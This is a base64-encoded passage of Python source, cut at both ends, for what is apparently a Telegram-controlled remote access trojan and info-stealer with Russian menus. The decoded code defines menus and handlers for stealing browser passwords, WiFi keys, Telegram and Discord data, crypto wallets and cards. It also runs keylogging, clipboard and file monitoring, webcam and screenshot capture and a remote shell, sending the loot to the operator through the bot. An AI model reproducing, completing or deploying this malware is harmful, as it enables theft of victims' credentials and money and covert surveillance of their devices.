CAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKS5nZXQoInJlc3VsdCIsIFtdKQogICAgICAgICAgICByZXR1cm4gW10KICAgICAgICBleGNlcHQ6IAogICAgICAgICAgICByZXR1cm4gW10KCiAgICBkZWYgY3JlYXRlX21haW5fa2V5Ym9hcmQoc2VsZik6CiAgICAgICAgcmV0dXJuIHsiaW5saW5lX2tleWJvYXJkIjogWwogICAgICAgICAgICBbeyJ0ZXh0IjogIvCflI0g0JrRgNCw0LbQsCDQtNCw0L3QvdGL0YUiLCAiY2FsbGJhY2tfZGF0YSI6ICJtZW51X3N0ZWFsIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCfjq8g0JzQvtC90LjRgtC+0YDQuNC90LMiLCAiY2FsbGJhY2tfZGF0YSI6ICJtZW51X21vbml0b3IifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi4pqhINCh0LjRgdGC0LXQvNCwIiwgImNhbGxiYWNrX2RhdGEiOiAibWVudV9zeXN0ZW0ifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+TgSDQpNCw0LnQu9GLIiwgImNhbGxiYWNrX2RhdGEiOiAibWVudV9maWxlcyJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5qAINCf0L7Qu9C90YvQuSDRgdC60LDQvSIsICJjYWxsYmFja19kYXRhIjogImZ1bGxfc2NhbiJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5uRINCe0KHQotCQ0J3QntCS0JjQotCsINCS0JjQoNCj0KEiLCAiY2FsbGJhY2tfZGF0YSI6ICJzdG9wX3ZpcnVzIn1dCiAgICAgICAgXX0KCiAgICBkZWYgY3JlYXRlX3N0ZWFsX2tleWJvYXJkKHNlbGYpOgogICAgICAgIHJldHVybiB7ImlubGluZV9rZXlib2FyZCI6IFsKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5SRINCf0LDRgNC+0LvQuCIsICJjYWxsYmFja19kYXRhIjogInN0ZWFsX3Bhc3N3b3JkcyJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5O2IFdpRmkiLCAiY2FsbGJhY2tfZGF0YSI6ICJ3aWZpX3Bhc3N3b3JkcyJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5OxIFRlbGVncmFtIiwgImNhbGxiYWNrX2RhdGEiOiAic3RlYWxfdGVsZWdyYW0ifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+OriBEaXNjb3JkIiwgImNhbGxiYWNrX2RhdGEiOiAic3RlYWxfZGlzY29yZCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5KwINCa0YDQuNC/0YLQviIsICJjYWxsYmFja19kYXRhIjogInN0ZWFsX2NyeXB0byJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5KzINCa0LDRgNGC0YsiLCAiY2FsbGJhY2tfZGF0YSI6ICJjcmVkaXRfY2FyZHMifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+MkCDQmNGB0YLQvtGA0LjRjyIsICJjYWxsYmFja19kYXRhIjogImJyb3dzZXJfaGlzdG9yeSJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5OEINCU0L7QutGD0LzQtdC90YLRiyIsICJjYWxsYmFja19kYXRhIjogInN0ZWFsX2RvY3VtZW50cyJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLirIXvuI8g0J3QsNC30LDQtCIsICJjYWxsYmFja19kYXRhIjogIm1lbnVfbWFpbiJ9XQogICAgICAgIF19CgogICAgZGVmIGNyZWF0ZV9tb25pdG9yX2tleWJvYXJkKHNlbGYpOgogICAgICAgIHJldHVybiB7ImlubGluZV9rZXlib2FyZCI6IFsKICAgICAgICAgICAgW3sidGV4dCI6ICLijKjvuI8g0JrQtdC50LvQvtCz0LPQtdGAINCS0JrQmyIsICJjYWxsYmFja19kYXRhIjogImtleWxvZ2dlcl9zdGFydCJ9LCB7InRleHQiOiAi4oyo77iPINCb0L7QsyIsICJjYWxsYmFja19kYXRhIjogImtleWxvZ2dlcl9nZXQifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+Wse+4jyDQnNGL0YjRjCDQktCa0JsiLCAiY2FsbGJhY2tfZGF0YSI6ICJtb3VzZV9zdGFydCJ9LCB7InRleHQiOiAi8J+Wse+4jyDQm9C+0LMiLCAiY2FsbGJhY2tfZGF0YSI6ICJtb3VzZV9nZXQifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+TiyDQkdGD0YTQtdGAINCS0JrQmyIsICJjYWxsYmFja19kYXRhIjogImNsaXBib2FyZF9zdGFydCJ9LCB7InRleHQiOiAi8J+TiyDQm9C+0LMiLCAiY2FsbGJhY2tfZGF0YSI6ICJjbGlwYm9hcmRfZ2V0In1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCfk4Eg0KTQsNC50LvRiyDQktCa0JsiLCAiY2FsbGJhY2tfZGF0YSI6ICJmaWxlX21vbml0b3Jfc3RhcnQifSwgeyJ0ZXh0IjogIvCfk4Eg0JvQvtCzIiwgImNhbGxiYWNrX2RhdGEiOiAiZmlsZV9tb25pdG9yX2dldCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn46Z77iPINCX0LDQv9C40YHRjCDQktCa0JsiLCAiY2FsbGJhY2tfZGF0YSI6ICJhdWRpb19zdGFydCJ9LCB7InRleHQiOiAi8J+Ome+4jyDQpNCw0LnQuyIsICJjYWxsYmFja19kYXRhIjogImF1ZGlvX2dldCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLij7nvuI8g0J7RgdGC0LDQvdC+0LLQuNGC0Ywg0LLRgdC1IiwgImNhbGxiYWNrX2RhdGEiOiAic3RvcF9hbGwifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi4qyF77iPINCd0LDQt9Cw0LQiLCAiY2FsbGJhY2tfZGF0YSI6ICJtZW51X21haW4ifV0KICAgICAgICBdfQoKICAgIGRlZiBjcmVhdGVfc3lzdGVtX2tleWJvYXJkKHNlbGYpOgogICAgICAgIHJldHVybiB7ImlubGluZV9rZXlib2FyZCI6IFsKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5K7INCY0L3RhNC+IiwgImNhbGxiYWNrX2RhdGEiOiAic3lzdGVtX2luZm8ifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+TiiDQntGC0YfQtdGCIiwgImNhbGxiYWNrX2RhdGEiOiAic3lzdGVtX3JlcG9ydCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLimqEg0J/RgNC+0YbQtdGB0YHRiyIsICJjYWxsYmFja19kYXRhIjogInByb2Nlc3NfbGlzdCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5SSINCR0LvQvtC60LjRgNC+0LLQutCwIiwgImNhbGxiYWNrX2RhdGEiOiAibG9ja19zY3JlZW4ifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+SgCDQl9Cw0LLQtdGA0YjQuNGC0Ywg0L/RgNC+0YbQtdGB0YEiLCAiY2FsbGJhY2tfZGF0YSI6ICJraWxsX3Byb2Nlc3MifV0sCiAgICAgICAgICAgIFt7InRleHQiOiAi8J+Wpe+4jyDQl9Cw0LrRgNGL0YLRjCDQsNC60YLQuNCy0L3QvtC1INC+0LrQvdC+IiwgImNhbGxiYWNrX2RhdGEiOiAia2lsbF9hY3RpdmVfcHJvY2VzcyJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5SnIENNRCIsICJjYWxsYmFja19kYXRhIjogInNoZWxsIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIuKshe+4jyDQndCw0LfQsNC0IiwgImNhbGxiYWNrX2RhdGEiOiAibWVudV9tYWluIn1dCiAgICAgICAgXX0KCiAgICBkZWYgY3JlYXRlX2ZpbGVzX2tleWJvYXJkKHNlbGYpOgogICAgICAgIHJldHVybiB7ImlubGluZV9rZXlib2FyZCI6IFsKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5O4INCh0LrRgNC40L3RiNC+0YIiLCAiY2FsbGJhY2tfZGF0YSI6ICJzY3JlZW5zaG90In1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCfjqUg0JLQtdCx0LrQsNC80LXRgNCwIiwgImNhbGxiYWNrX2RhdGEiOiAid2ViY2FtIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCfk7cg0KHQtdGA0LjRjyDRhNC+0YLQviIsICJjYWxsYmFja19kYXRhIjogImNhbWVyYV9idXJzdCJ9XSwKICAgICAgICAgICAgW3sidGV4dCI6ICLwn5OkINCX0LDQs9GA0YPQt9C40YLRjCDRhNCw0LnQuyIsICJjYWxsYmFja19kYXRhIjogInVwbG9hZF9maWxlIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIvCfk6Ug0KHQutCw0YfQsNGC0Ywg0YTQsNC50LsiLCAiY2FsbGJhY2tfZGF0YSI6ICJkb3dubG9hZF9maWxlIn1dLAogICAgICAgICAgICBbeyJ0ZXh0IjogIuKshe+4jyDQndCw0LfQsNC0IiwgImNhbGxiYWNrX2RhdGEiOiAibWVudV9tYWluIn1dCiAgICAgICAgXX0KCiAgICBkZWYgc2VuZF9tYWluX21lbnUoc2VsZik6CiAgICAgICAgbWVudV90ZXh0ID0gZiLwn6SWICrQn9Ce0JvQndCr0Jkg0JrQntCd0KLQoNCe0JvQrCDQkNCa0KLQmNCS0JjQoNCe0JLQkNCdKlxcXFxuXFxcXG7wn5K7ICrQodC40YHRgtC10LzQsDoqIHtwbGF0Zm9ybS5ub2RlKCl9XFxcXG7wn5GkICrQn9C+0LvRjNC30L7QstCw0YLQtdC70Yw6KiB7Z2V0cGFzcy5nZXR1c2VyKCl9XFxcXG7wn5al77iPICrQntChOioge3BsYXRmb3JtLnN5c3RlbSgpfSB7cGxhdGZvcm0ucmVsZWFzZSgpfVxcXFxuXFxcXG7QktGL0LHQtdGA0LjRgtC1INC60LDRgtC10LPQvtGA0LjRjjoiCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UobWVudV90ZXh0LCBzZWxmLmNyZWF0ZV9tYWluX2tleWJvYXJkKCkpCgogICAgZGVmIHNlbmRfc3RlYWxfbWVudShzZWxmKToKICAgICAgICBtZW51X3RleHQgPSAi8J+UjSAq0JrQoNCQ0JbQkCDQlNCQ0J3QndCr0KUqXFxcXG5cXFxcbtCS0YvQsdC10YDQuNGC0LUg0YfRgtC+INGD0LrRgNCw0YHRgtGMOiIKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShtZW51X3RleHQsIHNlbGYuY3JlYXRlX3N0ZWFsX2tleWJvYXJkKCkpCgogICAgZGVmIHNlbmRfbW9uaXRvcl9tZW51KHNlbGYpOgogICAgICAgIG1lbnVfdGV4dCA9ICLwn46vICrQnNCe0J3QmNCi0J7QoNCY0J3QkypcXFxcblxcXFxu0JLQmtCbL9CS0KvQmtCbINC80L7QvdC40YLQvtGA0LjQvdCzINC4INC/0YDQvtGB0LzQvtGC0YAg0LvQvtCz0L7QsjoiCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UobWVudV90ZXh0LCBzZWxmLmNyZWF0ZV9tb25pdG9yX2tleWJvYXJkKCkpCgogICAgZGVmIHNlbmRfc3lzdGVtX21lbnUoc2VsZik6CiAgICAgICAgbWVudV90ZXh0ID0gIuKaoSAq0KHQmNCh0KLQldCc0J3QntCVINCj0J/QoNCQ0JLQm9CV0J3QmNCVKlxcXFxuXFxcXG7Qo9C/0YDQsNCy0LvQtdC90LjQtSDRgdC40YHRgtC10LzQvtC5OiIKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShtZW51X3RleHQsIHNlbGYuY3JlYXRlX3N5c3RlbV9rZXlib2FyZCgpKQoKICAgIGRlZiBzZW5kX2ZpbGVzX21lbnUoc2VsZik6CiAgICAgICAgbWVudV90ZXh0ID0gIvCfk4EgKtCg0JDQkdCe0KLQkCDQoSDQpNCQ0JnQm9CQ0JzQmCpcXFxcblxcXFxu0KHQutGA0LjQvdGI0L7RgtGLLCDQutCw0LzQtdGA0LAg0Lgg0YTQsNC50LvRizoiCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UobWVudV90ZXh0LCBzZWxmLmNyZWF0ZV9maWxlc19rZXlib2FyZCgpKQoKICAgICMg0J7QsdGA0LDQsdC+0YLRh9C40LrQuCDQutC+0LzQsNC90LQKICAgIGRlZiBzdGVhbF9wYXNzd29yZHNfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+UhCDQmtGA0LDQtNGDINC/0LDRgNC+0LvQuC4uLiIpCiAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgc3RlYWxlci5zdGVhbF9hbGxfYnJvd3NlcnMoKQogICAgICAgIGlmIHN0ZWFsZXIuZGF0YVsicGFzc3dvcmRzIl06CiAgICAgICAgICAgIHBhc3N3b3Jkc190ZXh0ID0gIvCflJEgKtCd0JDQmdCU0JXQndCd0KvQlSDQn9CQ0KDQntCb0Jg6KlxcXFxuXFxcXG4iCiAgICAgICAgICAgIGZvciBwd2QgaW4gc3RlYWxlci5kYXRhWyJwYXNzd29yZHMiXVs6MTVdOgogICAgICAgICAgICAgICAgcGFzc3dvcmRzX3RleHQgKz0gZiIqe3B3ZFsnYnJvd3NlciddfToqXFxcXG7wn4yQIHtwd2RbJ3VybCddfVxcXFxu8J+RpCB7cHdkWyd1c2VybmFtZSddfVxcXFxu8J+UkCB7cHdkWydwYXNzd29yZCddfVxcXFxuXFxcXG4iCiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKHBhc3N3b3Jkc190ZXh0Wzo0MDAwXSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCf0LDRgNC+0LvQuCDQvdC1INC90LDQudC00LXQvdGLIikKCiAgICBkZWYgc2NyZWVuc2hvdF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5O4INCU0LXQu9Cw0Y4g0YHQutGA0LjQvdGI0L7Rgi4uLiIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBzY3JlZW5zaG90ID0gSW1hZ2VHcmFiLmdyYWIoKQogICAgICAgICAgICBzY3JlZW5zaG90X3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAidGdfc2NyZWVuc2hvdC5wbmciKQogICAgICAgICAgICBzY3JlZW5zaG90LnNhdmUoc2NyZWVuc2hvdF9wYXRoKQogICAgICAgICAgICB3aXRoIG9wZW4oc2NyZWVuc2hvdF9wYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuc2VuZF9waG90byhmLnJlYWQoKSwgIvCfk7gg0JDQutGC0YPQsNC70YzQvdGL0Lkg0YHQutGA0LjQvdGI0L7RgiIpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwINC+0YLQv9GA0LDQstC60Lgg0YTQvtGC0L4iKQogICAgICAgICAgICBvcy5yZW1vdmUoc2NyZWVuc2hvdF9wYXRoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J7RiNC40LHQutCwINGB0LrRgNC40L3RiNC+0YLQsDoge3N0cihlKX0iKQoKICAgIGRlZiB3ZWJjYW1fY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+OpSDQn9GL0YLQsNGO0YHRjCDRgdC00LXQu9Cw0YLRjCDRhNC+0YLQviDRgSDQstC10LHQutCw0LzQtdGA0YsuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgY2FwID0gY3YyLlZpZGVvQ2FwdHVyZSgwKQogICAgICAgICAgICByZXQsIGZyYW1lID0gY2FwLnJlYWQoKQogICAgICAgICAgICBpZiByZXQ6CiAgICAgICAgICAgICAgICB3ZWJjYW1fcGF0aCA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJ3ZWJjYW0uanBnIikKICAgICAgICAgICAgICAgIGN2Mi5pbXdyaXRlKHdlYmNhbV9wYXRoLCBmcmFtZSkKICAgICAgICAgICAgICAgIHdpdGggb3Blbih3ZWJjYW1fcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5zZW5kX3Bob3RvKGYucmVhZCgpLCAi8J+OpSDQpNC+0YLQviDRgSDQstC10LHQutCw0LzQtdGA0YsiKToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0L7RgtC/0YDQsNCy0LrQuCDRhNC+0YLQviIpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUod2ViY2FtX3BhdGgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L/QvtC70YPRh9C40YLRjCDRhNC+0YLQviDRgSDQutCw0LzQtdGA0YsiKQogICAgICAgICAgICBjYXAucmVsZWFzZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCS0LXQsdC60LDQvNC10YDQsCDQvdC10LTQvtGB0YLRg9C/0L3QsCIpCgogICAgZGVmIGNhbWVyYV9idXJzdF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5O3INCU0LXQu9Cw0Y4g0YHQtdGA0LjRjiDQuNC3IDUg0YTQvtGC0L4uLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgc3RlYWxlciA9IEFkdmFuY2VkU3RlYWxlcigpCiAgICAgICAgICAgIHBob3RvcyA9IHN0ZWFsZXIuc3RlYWxfY2FtZXJhX3Bob3Rvcyg1KQogICAgICAgICAgICBmb3IgaSwgcGhvdG9fZGF0YSBpbiBlbnVtZXJhdGUocGhvdG9zKToKICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLnNlbmRfcGhvdG8oYmFzZTY0LmI2NGRlY29kZShwaG90b19kYXRhKSwgZiLwn5O3INCk0L7RgtC+IHtpKzF9LzUiKToKICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZShmIuKdjCDQntGI0LjQsdC60LAg0L7RgtC/0YDQsNCy0LrQuCDRhNC+0YLQviB7aSsxfSIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDRgdGK0LXQvNC60LgiKQoKICAgIGRlZiBrZXlsb2dnZXJfc3RhcnRfY29tbWFuZChzZWxmKToKICAgICAgICBpZiBzZWxmLmtleWxvZ2dlci5zdGFydCgpOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4oyo77iPINCa0LXQudC70L7Qs9Cz0LXRgCDQkNCa0KLQmNCS0JjQoNCe0JLQkNCdIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQsNC60YLQuNCy0LDRhtC40Lgg0LrQtdC50LvQvtCz0LPQtdGA0LAiKQoKICAgIGRlZiBrZXlsb2dnZXJfc3RvcF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYua2V5bG9nZ2VyLnN0b3AoKQogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLij7nvuI8g0JrQtdC50LvQvtCz0LPQtdGAINCe0KHQotCQ0J3QntCS0JvQldCdIikKCiAgICBkZWYga2V5bG9nZ2VyX2dldF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OBINCe0YLQv9GA0LDQstC70Y/RjiDQu9C+0LMg0LrQu9Cw0LLQuNCw0YLRg9GA0YsuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgbG9nX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAia2V5bG9nLnR4dCIpCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGxvZ19wYXRoKToKICAgICAgICAgICAgICAgIHdpdGggb3Blbihsb2dfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5zZW5kX2RvY3VtZW50KGYucmVhZCgpLCAia2V5bG9nLnR4dCIsICLijKjvuI8g0JvQvtCzINC60LvQsNCy0LjQsNGC0YPRgNGLIik6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0J7RiNC40LHQutCwINC+0YLQv9GA0LDQstC60Lgg0YTQsNC50LvQsCIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCk0LDQudC7INC70L7Qs9CwINC90LUg0L3QsNC50LTQtdC9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGYi4p2MINCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4OiB7c3RyKGUpfSIpCgogICAgZGVmIG1vdXNlX3N0YXJ0X2NvbW1hbmQoc2VsZik6CiAgICAgICAgaWYgc2VsZi5tb3VzZV9sb2dnZXIuc3RhcnQoKToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCflrHvuI8g0JzQvtC90LjRgtC+0YDQuNC90LMg0LzRi9GI0Lgg0JDQmtCi0JjQktCY0KDQntCS0JDQnSIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0LDQutGC0LjQstCw0YbQuNC4INC80L7QvdC40YLQvtGA0LjQvdCz0LAg0LzRi9GI0LgiKQoKICAgIGRlZiBtb3VzZV9zdG9wX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5tb3VzZV9sb2dnZXIuc3RvcCgpCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKPue+4jyDQnNC+0L3QuNGC0L7RgNC40L3QsyDQvNGL0YjQuCDQntCh0KLQkNCd0J7QktCb0JXQnSIpCgogICAgZGVmIG1vdXNlX2dldF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OBINCe0YLQv9GA0LDQstC70Y/RjiDQu9C+0LMg0LzRi9GI0LguLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgbG9nX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAibW91c2Vsb2cudHh0IikKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMobG9nX3BhdGgpOgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGxvZ19wYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLnNlbmRfZG9jdW1lbnQoZi5yZWFkKCksICJtb3VzZWxvZy50eHQiLCAi8J+Wse+4jyDQm9C+0LMg0LzRi9GI0LgiKToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0L7RgtC/0YDQsNCy0LrQuCDRhNCw0LnQu9CwIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0KTQsNC50Lsg0LvQvtCz0LAg0L3QtSDQvdCw0LnQtNC10L0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoZiLinYwg0J7RiNC40LHQutCwINC+0YLQv9GA0LDQstC60Lg6IHtzdHIoZSl9IikKCiAgICBkZWYgY2xpcGJvYXJkX3N0YXJ0X2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5jbGlwYm9hcmRfc3RlYWxlci5zdGFydCgpCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfk4sg0JzQvtC90LjRgtC+0YDQuNC90LMg0LHRg9GE0LXRgNCwINC+0LHQvNC10L3QsCDQkNCa0KLQmNCS0JjQoNCe0JLQkNCdIikKCiAgICBkZWYgY2xpcGJvYXJkX3N0b3BfY29tbWFuZChzZWxmKToKICAgICAgICBzZWxmLmNsaXBib2FyZF9zdGVhbGVyLnN0b3AoKQogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLij7nvuI8g0JzQvtC90LjRgtC+0YDQuNC90LMg0LHRg9GE0LXRgNCwINCe0KHQotCQ0J3QntCS0JvQldCdIikKCiAgICBkZWYgY2xpcGJvYXJkX2dldF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLwn5OLINCe0YLQv9GA0LDQstC70Y/RjiDRgdC+0LTQtdGA0LbQuNC80L7QtSDQsdGD0YTQtdGA0LAuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgY2xpcGJvYXJkX3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAiY2xpcGJvYXJkLnR4dCIpCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGNsaXBib2FyZF9wYXRoKToKICAgICAgICAgICAgICAgIHdpdGggb3BlbihjbGlwYm9hcmRfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5zZW5kX2RvY3VtZW50KGYucmVhZCgpLCAiY2xpcGJvYXJkLnR4dCIsICLwn5OLINCY0YHRgtC+0YDQuNGPINCx0YPRhNC10YDQsCDQvtCx0LzQtdC90LAiKToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQntGI0LjQsdC60LAg0L7RgtC/0YDQsNCy0LrQuCDRhNCw0LnQu9CwIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKCLinYwg0KTQsNC50Lsg0LHRg9GE0LXRgNCwINC90LUg0L3QsNC50LTQtdC9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGYi4p2MINCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4OiB7c3RyKGUpfSIpCgogICAgZGVmIGZpbGVfbW9uaXRvcl9zdGFydF9jb21tYW5kKHNlbGYpOgogICAgICAgIHNlbGYuZmlsZV9tb25pdG9yLnN0YXJ0KCkKICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi8J+TgSDQnNC+0L3QuNGC0L7RgNC40L3QsyDRhNCw0LnQu9C+0LIg0JDQmtCi0JjQktCY0KDQntCS0JDQnSIpCgogICAgZGVmIGZpbGVfbW9uaXRvcl9zdG9wX2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5maWxlX21vbml0b3Iuc3RvcCgpCiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKPue+4jyDQnNC+0L3QuNGC0L7RgNC40L3QsyDRhNCw0LnQu9C+0LIg0J7QodCi0JDQndCe0JLQm9CV0J0iKQoKICAgIGRlZiBmaWxlX21vbml0b3JfZ2V0X2NvbW1hbmQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIvCfk4Eg0J7RgtC/0YDQsNCy0LvRj9GOINC70L7QsyDRhNCw0LnQu9C+0LIuLi4iKQogICAgICAgIHRyeToKICAgICAgICAgICAgbW9uaXRvcl9wYXRoID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImZpbGVfbW9uaXRvci50eHQiKQogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhtb25pdG9yX3BhdGgpOgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKG1vbml0b3JfcGF0aCwgInJiIikgYXMgZjoKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5zZW5kX2RvY3VtZW50KGYucmVhZCgpLCAiZmlsZV9tb25pdG9yLnR4dCIsICLwn5OBINCb0L7QsyDQvdC+0LLRi9GFINGE0LDQudC70L7QsiIpOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnNlbmRfbWVzc2FnZSgi4p2MINCe0YjQuNCx0LrQsCDQvtGC0L/RgNCw0LLQutC4INGE0LDQudC70LAiKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX21lc3NhZ2UoIuKdjCDQpNCw0LnQuyDQvNC+0L3QuNGC0L7RgNC40L3Qs9CwINC90LUg0L3QsNC50LTQtdC9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHNlbGYuc2VuZF9tZXNzYWdlKGYi4p2MINCe0YjQuN